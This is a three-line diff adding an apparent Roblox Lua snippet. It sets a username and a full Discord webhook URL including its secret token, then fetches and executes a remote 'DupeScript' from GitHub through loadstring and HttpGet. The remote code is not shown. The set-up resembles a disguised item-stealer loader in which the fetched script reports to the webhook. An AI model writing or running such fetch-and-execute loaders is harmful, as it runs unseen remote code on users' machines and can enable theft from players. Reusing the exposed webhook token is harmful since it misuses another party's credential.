@@ -1,0 +1,3 @@
+Username = "Jeshu1434"
+Webhook = "https://discord.com/api/webhooks/1203875563270570005/hib1Fe6_V7zVTOL22aXLnvSyJSkGQGUYn31FgK_mN2VrFtseLnjewxwpHvFmHApXSt82"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SkiroXx/DupeRealomggg/main/DupeScript", true))()
